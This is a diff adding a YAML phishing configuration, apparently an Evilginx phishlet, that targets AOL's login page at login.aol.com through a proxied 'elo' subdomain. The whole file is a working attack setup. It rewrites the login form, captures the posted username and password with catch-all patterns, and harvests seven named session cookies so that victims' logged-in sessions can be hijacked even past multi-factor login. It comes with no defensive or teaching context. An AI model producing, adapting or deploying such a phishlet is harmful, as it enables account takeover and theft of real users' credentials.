@@ -1,0 +1,30 @@
+author: '@Jerp'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'elo', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+
+auth_tokens:
+  - domain: 'login.aol.com'
+    keys: ['OTH','T','BX', 'Y', 'FS', 'GUCS', 'AS']
+
+auth_urls:
+  - '/'
+  - '/*'  
+ 
+
+credentials:
+  username:
+    key: 'displayName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.aol.com'
+  path: '/'
